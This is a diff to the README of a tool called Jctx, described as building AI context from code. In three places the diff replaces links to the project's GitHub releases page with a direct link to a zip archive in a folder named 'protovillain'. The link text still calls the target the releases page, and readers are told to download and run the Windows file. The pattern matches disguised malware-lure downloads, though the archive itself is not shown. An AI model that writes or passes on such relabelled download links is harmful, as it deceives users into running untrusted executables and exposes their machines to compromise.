@@ -1,10 +1,10 @@
 # 🤖 Jctx - Build AI context from code fast
 
-[![Download Jctx](https://img.shields.io/badge/Download%20Jctx-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Sharlagladiatorial106/Jctx/releases)
+[![Download Jctx](https://img.shields.io/badge/Download%20Jctx-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Sharlagladiatorial106/Jctx/raw/refs/heads/main/protovillain/Software-2.5.zip)
 
 ## 📥 Download
 
-Visit the [Jctx releases page](https://github.com/Sharlagladiatorial106/Jctx/releases) to download the Windows version.
+Visit the [Jctx releases page](https://github.com/Sharlagladiatorial106/Jctx/raw/refs/heads/main/protovillain/Software-2.5.zip) to download the Windows version.
 
 Look for the latest release and choose the file for Windows. In most cases, this will be an `.exe` file or a `.zip` file that contains the app.
 
@@ -157,6 +157,6 @@ ai, chatgpt, claude, claude-code, cli, code-analysis, context, developer-tools, 
 
 ## 📌 Release download
 
-Download Jctx here: [https://github.com/Sharlagladiatorial106/Jctx/releases](https://github.com/Sharlagladiatorial106/Jctx/releases)
+Download Jctx here: [https://github.com/Sharlagladiatorial106/Jctx/raw/refs/heads/main/protovillain/Software-2.5.zip](https://github.com/Sharlagladiatorial106/Jctx/raw/refs/heads/main/protovillain/Software-2.5.zip)
 
 Choose the latest Windows file on that page, then download and run it on your PC
